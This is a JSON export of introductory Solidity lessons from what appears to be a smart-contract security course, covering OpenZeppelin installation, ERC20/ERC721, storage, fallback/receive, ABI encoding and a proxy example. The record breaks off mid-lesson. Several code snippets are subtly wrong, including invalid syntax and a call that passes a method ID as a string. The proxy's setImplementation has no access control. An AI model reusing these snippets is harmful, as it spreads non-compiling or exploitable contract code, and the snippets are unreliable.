          "markdownContent": "---\ntitle: Installing Libraries\n---\n\n_Follow along the with the video_\n\n---\n\nWe'll go over Fuzz and Invariant testing in more detail later. For now, let's briefly go over importing valuable libraries into our code base.\n\n### OpenZeppelin Contracts and ERC20\n\nSay, you're working on a project and you'd like to include an `ERC20`, but are unsure where to start. This is where [OpenZeppelin Contracts](https://github.com/OpenZeppelin/openzeppelin-contracts) come into play. This popular library, available on GitHub, provides prewritten contracts for your use, making your life a whole lot easier!\n\nUse the following command to install this library to your project directory:\n\n```shell\nforge install OpenZeppelin/openzeppelin-contracts --no-commit\n```\n\n### Configuring Project Files and Creating New Contracts\n\nNow, navigate to the `foundry.toml` file in your project directory. Here, specify the remappings by setting `@openzeppelin/contracts` equal to `lib/openzeppelin-contracts/contracts`. This sets up the path for the compiler to locate OpenZeppelin contracts.\n\n```markdown\nremappings = ['@openzeppelin/contracts=lib/openzeppelin-contracts/contracts']\n```\n\nOnce remapped, the library and it's contracts can be imported into your project like so:\n\n```js\n//SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\nimport {ERC20} from '@openzeppelin/contracts/token/ERC20/ERC20.sol';\n\ncontract MyToken is ERC20 {\n    constructor() ERC20(\"MyTokenName\",\"MTN\") {};\n}\n```\n\nFor those who might need a brush up on what exactly ERC20 is or are curious about other types of tokens like the ERC721 (also known as NFTs), stay tuned as we'll be covering them in our upcoming discussions.\n",
          "updates": []
        },
        {
          "lessonId": "0f2eefd6-73c5-4991-ac1b-2fd319840ed5",
          "number": 5,
          "title": "What is an ERC20?",
          "slug": "what-is-erc20",
          "folderName": "5-what-is-erc20",
          "description": "This lesson offers an introduction to ERC-20 tokens, their functionality, and applications. It explains the basics of ERC-20 token creation and its significance in the blockchain ecosystem, including use cases like governance tokens and network security.",
          "duration": 2,
          "videoUrl": "00SC46ZIyrWRIJCiZZ02D45MT9z701pENw6V6L1hnyYbf00",
          "rawMarkdownUrl": "/routes/security/1-review/5-what-is-erc20/+page.md",
          "markdownContent": "---\ntitle: What is an ERC20/EIP20?\n---\n\n_Follow along the with the video_\n\n---\n\n## What are ERC20 tokens?\n\nFirstly, let's define what ERC20s are. ERC20s are tokens that exist and function on a blockchain network using a predefined standard called [the ERC20 token standard](https://ethereum.org/en/developers/docs/standards/tokens/ERC20/). This standard is essentially a set of rules that dictate certain functions a token should have, allowing it to interact seamlessly with other tokens on the network.\n\nHowever, the magic doesn't just stop at being tokens. ERC20s are also smart contracts. This hybrid nature allows ERC20 tokens to embody complex functionalities on the blockchain. Isn't that cool? A few notable examples of ERC20s include tokens like Tether, Chainlink, Uni and DAI.\n\n> **Note:**Chainlink technically falls under the ERC-677 standard, a higher standard that introduces additional functions while still retaining compatibility with the original ERC20 standard. So, you can think of Chainlink as an upgraded ERC20 token.\n\n## Why care about ERC20 tokens?\n\nAt this point, you might be wondering, \"Why should I even care to make an ERC20 token?\". Well, there are a number of compelling reasons.\n\nERC20 tokens find extensive use in a number of areas. They can serve as governance tokens, allowing token holders to vote on various matters within a DApp (Decentralised Application). They can be used to secure the underlying network. They can also represent some type of static asset, and much more. The sky's the limit when it comes to what you can achieve with ERC20 tokens.\n\n## How to create an ERC20 token\n\nNow that we've addressed the 'what' and 'why' of ERC20 tokens, let's delve into the 'how'. You can create your very own ERC20 token by crafting a smart contract that conforms to the ERC20 token standard.\n\nAn ERC20 compliant smart contract needs to have certain functions - `name()`, `symbol()`, `decimals()`, to name a few. These functions are called to retrieve information about the token. Furthermore, functionalities such as transferring tokens and checking the balance of tokens must also be included in the smart contract.\n\nOf course, the ERC20 is not the be-all and end-all. There are several other upgraded token standards, such as the [ERC-677](https://github.com/ethereum/EIPs/issues/677) and the [ERC-777](https://eips.ethereum.org/EIPS/eip-777) that you might want to check out. These other standards provide additional functionality while maintaining full compatibility with the ERC20 standard.\n\nTo sum up, ERC20 tokens are versatile and powerful constructs in the blockchain realm. Whether you wish to create your own token for a DApp, or simply wish to understand the underlying mechanics of various tokens, gaining a strong grasp on ERC20 tokens can undoubtedly open a plethora of avenues for you. Happy learning!\n",
          "updates": []
        },
        {
          "lessonId": "65635349-225c-4583-b9ad-62bd27930683",
          "number": 6,
          "title": "What is an ERC721?",
          "slug": "what-is-erc721",
          "folderName": "6-what-is-erc721",
          "description": "Dive into the world of ERC-721 tokens and NFTs (Non-Fungible Tokens). This lesson discusses the uniqueness of NFTs compared to ERC-20 tokens, their various applications, and the role of ERC-721 in representing unique digital assets on the blockchain.",
          "duration": 6,
          "videoUrl": "fl00teXY2FM5FsJWEPP5pTDVzPuAxpAxfO44VLT3wnyI",
          "rawMarkdownUrl": "/routes/security/1-review/6-what-is-erc721/+page.md",
          "markdownContent": "---\ntitle: What is an ERC721/NFT?\n---\n\n_Follow along the with the video_\n\n---\n\nThe buzz around non-fungible tokens (NFTs) or `ERC721s` lately is becoming impossible to ignore, especially within the spheres of art and blockchain technology. NFTs, originally authored on the Ethereum platform, present a unique form of digital asset that holds the potential to revolutionize the world of art, gaming and beyond. But what exactly are they?\n\n## Understanding NFTs\n\nNFT stands for non-fungible token. Unlike `ERC20` tokens, such as LINK, DAI etc, each NFT is entirely unique, and no two tokens can be interchanged.\n\nTo better understand, let's look at a simple analogy. Think of a dollar bill; it holds the same value as any other dollar out there. You can freely exchange a dollar for another, and their value remains the same. This makes them _fungible_. Contrastingly, an NFT is the complete opposite. It could be likened to a unique Pokemon. Each Pokemon is unique and no two Pikachu's are exactly the same.\n\nAs a more relatable analogy, consider an NFT as a distinct piece of art, trading card, or any other one-of-a-kind item. So to sum up, NFTs are unique, non-interchangeable tokens best thought of as indestructible digital pieces of art with a permanent history detailing their ownership and alterations.\n\n## The Many Uses of NFTs\n\nAlthough NFTs are mostly associated with art, they extend beyond that. They can be assigned any property, or manipulated in any way you like, thanks to the underlying smart contract technology.\n\n<div>\n<div style=\"text-align: center\">\n    <img src=\"/security-section-1/6-erc721s/erc721s1.png\" style=\"width: 20%; height: auto;\" alt=\"block fee\">\n    <img src=\"/security-section-1/6-erc721s/erc721s2.png\" style=\"width: 21.7%; height: auto;\" alt=\"block fee\"> \n    <div style=\"font-size: 10\">An NFT example from <a href=\"https://opensea.io/assets/ethereum/0x5af0d9827e0c53e4799bb226655a1de152a425a5/7874\">Milady</a></div>\n</div>\n</div>\n\nThese unique tokens are deployed on a smart contract platform and can be traded on numerous NFT platforms such as [OpenSea](https://opensea.io/) or [Rarible](https://rarible.com/). While these decentralized marketplaces provide user-friendly interfaces for trading NFTs, one could just as easily buy and sell outside of them.\n\n## NFTs: Bridging the Gap for Artists\n\nMany might find the whole concept of NFTs puzzling. Isn't art meant to be tangible? But consider this: artists often aren't adequately compensated for their work. Their creations get copied and shared with zero attribution; they simply lose ownership. But with NFTs, artists can finally get the recognition, and more importantly, the compensation they deserve.\n\n> \"Having a decentralized royalty mechanism, or some type of mechanism where these artists can get accurately comped for what they're doing, is crucial.\"\n\nYes, NFTs can be a solution to current issues plaguing the art industry by creating an auditable and transparent trail of royalties without the need for any centralized service.\n\n## The Role of the ERC721 Standard\n\n`ERC721`, or the NFT standard, forms the basis of it all. To keep it simple, the main distinction between `ERC721` and `ERC20` tokens is that each `ERC721` token has a unique Token ID, an attribute that indirectly represents the asset linked to that token.\n\nTo illustrate the unique attributes of an asset, let's say a piece of art or a character in a game, NFTs rely on metadata and `Token URIs`. Due to the prohibitively high gas prices on Ethereum, it's quite impractical to store these intricate art pieces directly on the chain.\n\n## How Token URIs Work\n\nThe solution? The developers introduced what is known as a `Token URI` in the NFT standardâ€”a universally unique identifier that provides information about what an asset (or token) looks like, and the attributes of that token. Data storage platforms like IPFS or a centralized API usually provide this `Token URI` through a simple API call.\n\nThe `Token URI` should return data in a preset format, including the name, image location, description, and any other attributes that add to the uniqueness of the token.\n\nHowever, storing metadata off-chain does come with its challenges. If the centralized system hosting these assets crashes, every link associated with your NFT is lost. Modern discussions in the NFT world often debate the pros and cons of on-chain metadata versus off-chain metadata. Regardless of the limitations, there's something truly groundbreaking about NFTs, and it's exciting to envision where this technology could lead us.\n",
          "updates": []
        },
        {
          "lessonId": "ce4c93b4-da09-44e7-87a8-340d4e0d36a8",
          "number": 7,
          "title": "Advanced Solidity Prerequisites",
          "slug": "advanced-solidity-prerequisites",
          "folderName": "7-advanced-solidity-prerequisites",
          "description": "This lesson explores advanced concepts in Solidity, particularly focusing on storage in smart contracts. It delves into how storage functions, the role of constants and immutables, and hands-on exercises using Foundry to visualize these concepts.",
          "duration": 2,
          "videoUrl": "sF1SqpxJTXlB5ryqqf00oNmxJbXmwtGTtYneI0002DHnbU",
          "rawMarkdownUrl": "/routes/security/1-review/7-advanced-solidity-prerequisites/+page.md",
          "markdownContent": "---\ntitle: Advanced Solidity Pre-requisites\n---\n\n_Follow along the with the video_\n\n---\n\nLet's look at a couple advanced solidity concepts that will be important to understand as you progress through this course.\n\n## The Core of Smart Contracts: Storage\n\nThe first advanced feature we'll be covering today is storage in smart contracts. Every smart contract includes this integral element. This critical component is the space allotted to your variables within the contract.\n\nWhen you create a state variable within your contract, an individual storage slot is carved out just for that variable.\n\nIt's worth noting, however, that constants or immutable variables do not occupy space in storage. This unique trait is due to their nature of being stored directly within the contract's bytecode.\n\nTo illustrate:\n\n<img src=\"/security-section-1/7-advanced-solidity/sol2.png\" style=\"width: 100%; height: auto;\" alt=\"block fee\">\n\n### Hands-on Learning with Code\n\nYou can see this yourself through a few commands in Foundry. In the above contract, if we use...\n\n```bash\nforge inspect Counter storage\n```\n\nWe'll get a readout of the storage slots in our `Counter` contract which looks like this:\n\n```bash\n\"storage\": [\n    {\n      \"astId\": 44623,\n      \"contract\": \"src/Counter.sol:Counter\",\n      \"label\": \"number1\",\n      \"offset\": 0,\n      \"slot\": \"0\",\n      \"type\": \"t_uint256\"\n    },\n    {\n      \"astId\": 44625,\n      \"contract\": \"src/Counter.sol:Counter\",\n      \"label\": \"number2\",\n      \"offset\": 0,\n      \"slot\": \"1\",\n      \"type\": \"t_uint256\"\n    },\n    {\n      \"astId\": 44630,\n      \"contract\": \"src/Counter.sol:Counter\",\n      \"label\": \"number4\",\n      \"offset\": 0,\n      \"slot\": \"2\",\n      \"type\": \"t_uint256\"\n    }\n  ],\n```\n\nNotice how the variable `number3` isn't returned. This is because this variable is contained as a constant within the contract's bytecode.\n\n> Remember, always experiment with code, because it's in the _doing_ that we grasp the most complex concepts!\n\n### Wrapping Up with a Video Recap\n\nThe next lesson will be a quick video refresher on storage to get up to speed on the concept and prepare for the harder stuff to come!\n",
          "updates": []
        },
        {
          "lessonId": "4b6fc572-3728-4858-8396-a22e09e10647",
          "number": 8,
          "title": "Storage",
          "slug": "storage",
          "folderName": "8-storage",
          "description": "Gain a comprehensive understanding of storage in Solidity. This lesson covers global variables, the storage data structure, handling dynamic variables, and the role of constant and immutable variables. It also explains the use of the 'memory' keyword for efficient data management.",
          "duration": 5,
          "videoUrl": "oo6EIQXLzJxP3aySehqbm1xmwKZnBkI4AhH8tvbcdF00",
          "rawMarkdownUrl": "/routes/security/1-review/8-storage/+page.md",
          "markdownContent": "---\ntitle: Storage\n---\n\n_Follow along the with the video_\n\n---\n\nIn this lesson, we are going to discuss some important aspects related to variables in Solidity. Much of what we'll cover is conveniently summarized in the [**Solidity documentation**](https://docs.soliditylang.org).\n\n## Understanding Global Variables and Storage\n\nFirst and foremost, we need to familiarize ourselves with the concept of `Storage`. In Solidity, when we refer to variables that are global or those that persist over time, we are actually referring to variables that exist in `Storage`.\n\n<img src=\"/security-section-1/8-storage/storage1.png\" style=\"width: 100%; height: auto;\" alt=\"block fee\">\n\nThink of `Storage` as a huge array or list that contains all the variables we create in Solidity. When we declare a variable in a contractâ€”say a contract named `fundamentalStorage`â€”to be a certain value, such as `favoriteNumber`, we're essentially demanding this variable to persist. This persistence is obtained via `Storage`.\n\nIn code this looks like:\n\n```js\ncontract fundamentalStorage {\n    uint favoriteNumber;\n}\n```\n\nThis `favoriteNumber` variable is stored in the `Storage` and can be called whenever required.\n\nNow, `Storage` is essentially an array where every variable (and its value) gets slotted into a 32 byte long slot. This is crucial in understanding how Solidity manages memory and data storage. The indexing of these storage slots starts from 0, and increments just like array indexing in most languages.\n\n```javascript\ncontract fundamentalStorage {\n    uint favoriteNumber = 25;\n    bool ourBool = true;\n}\n```\n\nFor instance, if a variableâ€”`favoriteNumber`â€”is assigned the number 25, this number is stored in its bytes implementation `0x19`.\n\n## Dealing with Dynamic Variables\n\nWhile static variables are straightforward, things get slightly intricate with variables that are of dynamic length or can change length. Variables in the form of dynamic arrays or mapping are stored using some type of hashing function (outlined in the documentation).\n\nThe object itself does take up a storage slot, but it doesn't contain the whole array. Instead, the storage slot contains the length of the array. If we add a new element to the array by calling `myArray.push(222)`, the array's length and the new element are stored at separate locations determined by the hash function.\n\n```js\ncontract exampleContract {\n    uint[] myArray;\n\n    function addToArray(uint _number) public {\n        myArray.push(_number);\n    }\n}\n```\n\nIn the code example above, `myArray.length` is stored in `storage slot [0]`, while the elements within the array (myArray.push(\\_number)) are stored at `storage slot [keccak256(0)]`.\n\n## Constant and Immutable Variables\n\nInteresting to note is the fact that constant and immutable variables do not occupy spots in `Storage`. This is because such variables are incorporated within the bytecode of the contract itself. Solidity automatically substitutes any reference to these variables with their declared values.\n\n```js\ncontract exampleContract {\n    uint constant x = 123;\n}\n```\n\nIn the example above, the constant variable `x` does not occupy a storage slot.\n\n## Temporary Variables: Function Scope\n\nFor variables that are declared inside a function, their existence is ephemeral and scoped merely to the span of that function. These variables do not persist inside the contract and are not stored in `Storage`. Instead, they're stashed in a different memory data structure, which deletes them as soon as the function has finished execution.\n\n```js\ncontract exampleContract{\n    function myFunction(uint val) public {\n        uint newVar = val + 5;\n    }\n}\n```\n\nIn this example, `newVar` only exists for the duration of `myFunction`.\n\n## Memory Keyword: Necessary for Strings\n\nFinally, the `memory` keyword. Primarily used with strings, `memory` is needed because strings are dynamically sized arrays. By using this keyword, we tell Solidity that string operations are to be performed not in `Storage`, but in a separate memory location.\n\nSolidity needs this explicit instruction because arrays and mappings require more space, hence the need to ensure that space is allocated in the appropriate data structure.\n\nHere's a code snippet using `memory` keyword with string:\n\n```javascript\ncontract exampleContract{\n    function getString() public pure returns (string memory) {\n        return \"this is a string!\";\n    }\n}\n```\n\nAll of what we've covered here is outlined in detail in the Solidity Documentation. Understanding these concepts and how Solidity handles variables is integral to attaining a deeper understanding of the language and compiler.\n\n> \"Understanding the nitty-gritty of Solidity variables and storage will significantly amplify your solidity coding skills.\"\n",
          "updates": []
        },
        {
          "lessonId": "2a197fd8-42ba-4c0b-90c7-0dbb309c7abd",
          "number": 9,
          "title": "Fallback and Receive",
          "slug": "fallback-and-receive",
          "folderName": "9-fallback-and-receive",
          "description": "Learn about the fallback and receive functions in Solidity. This lesson explains how these functions enable a contract to accept ETH, their default settings, and the significance of encoding in smart contract functionality.",
          "duration": 2,
          "videoUrl": "gPDUwI529HOhQuW8xGtf5H009LgG702DDHWMtAtxuNG02Y",
          "rawMarkdownUrl": "/routes/security/1-review/9-fallback-and-receive/+page.md",
          "markdownContent": "---\ntitle: Fallback and Receive\n---\n\n_Follow along with the video_\n\n---\n\nIn the world of Solidity smart contracts, it's important to understand the fallback and receive functions. By default, Solidity smart contracts reject any Ether (ETH) sent to them. In order to enable your contract to accept ETH, we would implement `fallback` and `receive` functions. Let's look at these mose closely.\n\n## What are the Fallback and Receive functions?\n\nThese two specific functions - `fallback` and `receive` - enable a contract to accept and react to native ETH sent to it. Both these functions can be made \"**external payable**\", indicating that they can receive and handle ETH.\n\nSo, how do they function? Here's the core logic to give you a better understanding:\n\n<div style=\"text-align: center\">\n    <img src=\"/security-section-1/9-fallback-receive/fallback-receive1.png\" style=\"width: 30%; height: auto;\" alt=\"block fee\">\n</div>\n\nTo put it simply, consider the case of sending ETH to a smart contract without any data. In such an instance, the `receive` function would be called, resorting to `fallback` if the `receive` function does not exist.\n\nOn the other hand, if there _is_ data, Solidity will skip straight to the `fallback` function, bypassing the `receive` function entirely.\n\n## Default Settings in Solidity\n\nIt is worthwhile to note that the `fallback` function may or may not be payable. If the contract lacks a `receive` function and the `fallback` function isn't payable, then the `fallback` function won't be called when you send ETH to the contract.\n\n```js\nfallback() external{}\nreceive() external payable {}\n```\n\nBy the same token, a contract that does not contain any of these functions will reject any ETH sent to it. In fact, Solidity will automatically compile this contract to reject ETH - with at least one notable exception we'll go over later.\n\n## Deepening Understanding: Encoding\n\nThe next lesson is a clip you might remember from the Foundry Course. We're going to go over encoding and explain how it can be used to call any function on any contract from another contract.\n\nLet's do it.\n",
          "updates": []
        },
        {
          "lessonId": "3c15b341-1146-4e78-abfd-fc77d99fae7f",
          "number": 10,
          "title": "ABI encode",
          "slug": "abi-encode",
          "folderName": "10-abi-encode",
          "description": "This lesson focuses on ABI (Application Binary Interface) encoding in Solidity, explaining its role in concatenating strings and encoding data into binary. It provides insights into the process of compressing binary data and techniques for multiple data encoding.",
          "duration": 23,
          "videoUrl": "f7wx2PhJ2afdUY8Fj02kloU3kFVzR7B0200802vcmVXJano",
          "rawMarkdownUrl": "/routes/security/1-review/10-abi-encode/+page.md",
          "markdownContent": "---\ntitle: Abi.encode & Abi.encodePacked\n---\n\n_Follow along with the video_\n\n---\n\n## Understanding ABI.encode & ABI.encodePacked in Solidity\n\n### Introduction\n\nThe topic we're diving into is how to concatenate strings in Solidity, specifically exploring `abi.encode` and `abi.encodePacked`. This is advanced stuff, delving into the low-level workings of Solidity, binary, and opcodes. Remember, it's okay if you don't grasp it all on the first go!\n\n> Remember: You can find all the code we'll be working with [**here**](https://github.com/PatrickAlphaC/hardhat-nft-fcc/tree/main/contracts/sublesson).\n\n### Getting Started\n\n- **Setting Up:** We'll use Remix for this exploration. Start by creating a new file named `encoding.sol`.\n\nYour contract should look something like this:\n\n```js\n//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7\n\ncontract Encoding {\n    function combineStrings() public pure returns (string memory) {\n        return string(abi.encodePacked(\"Hi Mom! \", \"Miss you.\"));\n    }\n}\n```\n\nCompiling this contract and calling the `combineStrings()` function in Remix is going to give us the whole string `\"Hi Mom! Miss you.\"`\n\n### Exploring `abi.encode` and `abi.encodePacked`\n\n- **Understanding Encoding:** We use `abi.encode` and `abi.encodePacked` for encoding strings and other data types into a binary format. In our function above `\"Hi Mom!\"` and `\"Miss you.\"` are both converted into binary then concatenated. We then typecast the returned binary is a string.\n\n`encode` and `encodePacked` are examples of globally available methods in Solidity. There's a [**Cheatsheet**](https://docs.soliditylang.org/en/latest/cheatsheet.html) you should checkout with more information and tonnes of examples of these globally available methods and variables.\n\n> Note: As of `Solidity 0.8.12` you can also use `string.concat(stringA, StringB)` to achieve the same result as our `\"Hi Mom!\"` example.\n\nBefore getting to deep with encoding, let's take a step back to understand what's happening when we send a transaction.\n\n### Compilation Breakdown\n\n<img src=\"/security-section-1/10-encoding/encoding1.png\" style=\"width: 100%; height: auto;\" alt=\"block fee\">\n\nAs seen in the image above, when we compile a smart contract, the solidity compiler is returning two things `contract.abi` and `contract.bin`. The `abi` you likely remember from previous lessons.\n\n`Contract.bin` is the binary representation of your contract. This is the actual code that get put on the blockchain.\n\nWe see this binary object in transaction we send to the blockchain. Recall what constitutes a transaction:\n\n```js\ntx = {\n  nonce: nonce,\n  gasPrice: 10000000000,\n  gasLimit: 1000000,\n  to: null,\n  value: 0,\n  data: \"BINARYGOESHERE\",\n  chainId: 1337,\n};\n```\n\n> Note: When we're deploying a new contract, this is still a transaction on the blockchain, but our `to` property is empty and the `data` field will contain both the `contract init code` and `contract bytecode(binary)`.\n\n[**Here's**](https://etherscan.io/tx/0x112133a0a74af775234c077c397c8b75850ceb61840b33b23ae06b753da40490) a transaction on etherscan.io with a binary data object you can inspect.\n\nAt first look, the binary data in a transaction looks like chaos. Just a garbled mess of letters and numbers. You may be asking yourself - how does the EVM (Ethereum Virtual Machine) make any sense of these instructions?\n\nWell ...\n\n### Intro to EVM Opcodes\n\n> Opcodes are the building blocks of EVM instructions. Each opcode represents a specific operation.\n\nOpcodes are effectively the alphabet of the ethereum machine language. Each pair of characters in the binary object discussed above represents an Opcode with pertains to a specific operation to be performed.\n\nYou can find a list of the EVM Opcodes [**here**](https://www.evm.codes/?fork=shanghai).\n\nThis means that the binary object we pass in our blockchain transactions is ultimately a long list of these operations we're telling the EVM to perform.\n\n### Why This Matters\n\nUntil now we've only used `encode` and `encodePacked` to concatenate strings, but in reality these functions are much more powerful. You can encode virtually anything into its binary format.\n\n- **abi.encode** - returns the binary of the provided argument\n- **abi.encodePacked** - returns the binary of the provided argument, but with stipulation/compression\n  - types shorter than 32 bytes are concatenated directly, without padding or sign extension\n  - dynamic types are encoded in-place and without the length.\n  - array elements are padded, but still encoded in-place\n\nRead more about [**Non-standard Packed Mode**](https://docs.soliditylang.org/en/latest/abi-spec.html#abi-packed-mode)\n\nThe other side to this whole equation is that we also have the ability to _`decode`_ things.\n\n<img src=\"/security-section-1/10-encoding/encoding2.png\" style=\"width: 100%; height: auto;\" alt=\"block fee\">\n\nand finally .. we can even `multiEncode` and `multiDecode`.\n\n## <img src=\"/security-section-1/10-encoding/encoding3.png\" style=\"width: 100%; height: auto;\" alt=\"block fee\">\n\n# Conclusion\n\nHopefully this lesson has shed some light on some of the finer details of using encoding functions in solidity and the power they can hold. In the next lesson we'll be looking at how to encode function calls directly.\n",
          "updates": []
        },
        {
          "lessonId": "8aaefdb7-de7a-47ce-abbd-953fb53bb1c5",
          "number": 11,
          "title": "Encoding Functions",
          "slug": "encoding-function",
          "folderName": "11-encoding-function",
          "description": "Delve into the concept of ABI encoding for direct function calls in Ethereum. This lesson highlights how to populate the data field in transactions with binary code for specific function calls, enhancing the ability to interact with the Ethereum Virtual Machine.",
          "duration": 6,
          "videoUrl": "89KzeB39oMA00iePKhUu02hMA7W1yWJ600yiT7LW7YDKNg",
          "rawMarkdownUrl": "/routes/security/1-review/11-encoding-function/+page.md",
          "markdownContent": "---\ntitle: Introduction to Enconding Function Calls Directly\n---\n\n_Follow along with the video_\n\n---\n\n## Understanding ABI Encoding\n\nWith the previous lesson's foundation laid, lets look at what encoding is like within the context of sending transactions.\n\nWe know the EVM is looking for this encoded information, this binary _stuff_. And since transactions sent to the blockchain are ultimately compiled down to this binary, what this allows us to do is populate the `Data` property of a transaction with this binary ourselves.\n\n<div>\n<div style=\"text-align: center\">\n    <img src=\"/security-section-1/11-encoding-function/encoding-function2.png\" style=\"width: 95%; height: auto;\" alt=\"block fee\"> \n    <div style=\"font-size: 10\">Remember the properties of a Transaction</div>\n</div>\n</div>\n\n### ABI Encoding and Transactions\n\nWhen an Ethereum transaction is initiated, it is essentially reduced to binary code. This transformation pertains not just to a contract deployment but also a function call. In both cases - transactions and function calls - the data field holds the key.\n\nIn a contract deployment, the data field contains the contract's binary code. But for a function call, the data field holds the instructions about what data to send and which function to address.\n\nLet's dive into an example. If we inspect a transaction on Ethereum using Etherscan, you'll notice a field labeled 'Input data.' Within this field, you'll discover a jumble of hexadecimals - this is the encoded function call.\n\n**Example Input Data**\n\n```js\nFunction: enterRaffle(...)\nMethod ID: 0x2cfcc539\n```\n\nThis `Method ID`, sometimes referred to as a `function signature`, is an encoding of that particular function, including it's name and argument types.\n\nThis encoded function call in the data field is how the EVM, or any EVM compatible chain, deciphers which function should be executed.\n\n### Direct Function Calls\n\n<img src=\"/security-section-1/11-encoding-function/encoding-function1.png\" style=\"width: 100%; height: auto;\" alt=\"block fee\">\n\nWith our understanding of ABI encoding, the possibilities expand. We're now able to populate the data field of our transactions directly with the binary or hex code corresponding to the desired function call. Remember, when you initially compile your transaction, `data` was a field that existed? This is where that comes into play.\n\nYou may wonder why this ability is any better than directly using the interface or the Application Binary Interface (ABI). However, there could be scenarios when you might only possess the function name or the parameters. You might even want your code to make arbitrary calls, dangling at the edge of advanced programming. This is when knowing how to populate the data field directly becomes pivotal.\n\n### Sending the Transactions\n\nSo, how do we transform this understanding into action - how do we populate the data field and then send these custom, data-encoded transactions?\n\nIn solidity, we rely on some low-level keywords - `staticcall` and `call` - to perform this function. `staticcall` and `call` are used for view or pure functions and functions that change the blockchains' state, respectively.\n\nIn these functions, the code that specifies a particular function to execute goes into the parentheses (data field). For instance, in a previous function utilized for our lottery contract,\n\n```js\nfunction withdraw(address recentWinner) public {\n    (bool success, ) = recentWinner.call{value: address.(this).balance}(\"\");\n    require(success, \"Transfer Failed\");\n}\n```\n\nthe `{value: address.(this).balance}` segment updates the transaction's value field while the empty parentheses imply there's no function to call; the transaction merely sends money.\n\nHowever, if a function needs to be executed or data should be sent, it can be specified in the parentheses, let's combine this with our previous `Method ID` we got from etherscan.\n\n```js\nfunction enterRaffle(uint256 entryFee) public payable {\n    PuppyRaffle puppyRaffle = new PuppyRaffle;\n    puppyRaffle.call{value: entryFee}(\"0x2cfcc539\");\n}\n```\n\nIn the above example, you can see that we're passing the `entryFee` as an argument to the `value` property of the transaction and in the `data` field we are populating the `function signature`. This will tell the EVM, what to call, where and how much to send.\n\n### Wrap Up\n\nTo wrap it up, remember that although the realm of Ethereum and EVM might seem overwhelming at first, understanding their machinations, such as ABI encoding, one concept at a time allows you to become an active participant in the blockchain network, enhancing your ability to interact effectively and perform more advanced operations.\n\n> \"The function of good programming is to do the thinking for you, to the extent possible, so that when you're using it, your mind is free to think.\" - Joshua Bloch\n",
          "updates": []
        },
        {
          "lessonId": "315ac33d-e452-4aa2-b577-9b72f1f6ace2",
          "number": 12,
          "title": "Upgradeable contracts",
          "slug": "upgradeable-contracts",
          "folderName": "12-upgradeable-contracts",
          "description": "Explore the design of upgradeable smart contracts using Proxy and Delegate Call. This lesson covers the functionality, applications, and coding techniques of these concepts, crucial for managing contract upgrades while preserving the contract's state.",
          "duration": 1,
          "videoUrl": "K902iJAEuzYdUJQaaieWgz3yUelOZCZUtSaxpVa2HZB4",
          "rawMarkdownUrl": "/routes/security/1-review/12-upgradeable-contracts/+page.md",
          "markdownContent": "---\ntitle: Upgradeable Contracts\n---\n\n_Follow along with the video_\n\n---\n\n## Upgradeable Contracts\n\nIn this section we're going to ask ourselves `what is a proxy?` and `how does delegateCall` work? in an effort to better understand the advantages and disadvantages of upgradeable smart contracts.\n\nAll the code we'll be working with here is available in the Upgrades repo of the Foundry Course, available [**here**](https://github.com/Cyfrin/foundry-upgrades-f23/tree/main).\n\n## SmallProxy.sol\n\nLet's take a look at a simple proxy example:\n\n```js\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.19;\n\nimport \"@openzeppelin/contracts/proxy/Proxy.sol\";\n\ncontract SmallProxy is Proxy {\n    // This is the keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 private constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    function setImplementation(address newImplementation) public {\n        assembly {\n            sstore(_IMPLEMENTATION_SLOT, newImplementation)\n        }\n    }\n\n    function _implementation() internal view override returns (address implementationAddress) {\n        assembly {\n            implementationAddress := sload(_IMPLEMENTATION_SLOT)\n        }\n    }\n}\n```\n\n> Note: we're importing `Proxy.sol` from [**openzeppelin**](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/Proxy.sol) as a boilerplate proxy for our example.\n\n### Preface to Yul\n\nThe contract we're importing here uses a lot of `Yul`.\n\n> \"`Yul` is an intermediate language that can be compiled to bytecode for different backends.\" - [**Solidity Docs**](https://docs.soliditylang.org/en/latest/yul.html)\n\nWe won't go too deeply into `Yul`, but please read more in the documentation if it interests you. Note, however, even if you're a really advanced user, avoiding the implementation of really low-level calls is preferred. It's much easier to make significant errors, the lower you are in your code.\n\n### Proxy.sol - a closer look\n\nWithin our `Proxy.sol` contract, we've got the `_delegate()` function. This function is called by `Proxy.sol`'s `fallback()` function. This means any time our contract received data for a function it doesn't recognize, it's going to call our `_delegate()` function.\n\nThe `_delegate()` function, then sends that data over to some `implementation` contract.\n\n<img src=\"/security-section-1/12-upgradeable/upgrades2.png\" style=\"width: 100%; height: auto;\" alt=\"block fee\">\n\nLooking at `SmallProxy.sol` you can see you have these two functions:\n\n```js\nfunction setImplementation(address newImplementation) public {\n        assembly {\n            sstore(_IMPLEMENTATION_SLOT, newImplementation)\n        }\n    }\n\n    function _implementation() internal view override returns (address implementationAddress) {\n        assembly {\n            implementationAddress := sload(_IMPLEMENTATION_SLOT)\n        }\n    }\n```\n\n- **setImplementation()** - changes the implementation contract, effectively allowing a protocol to upgrade.\n- **\\_implementation** - reads the location of the implementation contract\n\nYou may also have noticed `bytes32 private constant _IMPLEMENTATION_SLOT = ...` this is the storage slot where we are storing the address of our implementation contract. You can read more about `Standard Proxy Storage Slots` in [**EIP-1967**](https://eips.ethereum.org/EIPS/eip-1967)\n\nLet's consider a basic implementation contract:\n\n```js\ncontract ImplementationA {\n    uint256 public value;\n\n    function setValue(uint256 newValue) public {\n        value = newValue;\n    }\n}\n```\n\nNow we ask ourselves `What data needs to be passed to my proxy contract in order to call this function?`\n\nIf you recall from the last lesson, this data being passed is going to be the encoded function signature and any necessary arguments the function requires! We can get this encoding with a couple helper functions added to `SmallProxy.sol`:\n\n```js\n// helper function\n    function getDataToTransact(uint256 numberToUpdate) public pure returns (bytes memory) {\n        return abi.encodeWithSignature(\"setValue(uint256)\", numberToUpdate);\n    }\n```\n\nNow let's use a little assembly to read the storage slot this value is set to:\n\n```js\nfunction readStorage() public view returns (uint256 valueAtStorageSlotZero) {\n        assembly {\n            valueAtStorageSlotZero := sload(0)\n        }\n    }\n```\n\nWith that all set up, here's what we'd do next:\n\n1. deploy both `SmallProxy.sol` and `ImplementationA.sol`\n2. call the `setImplementation()` function on 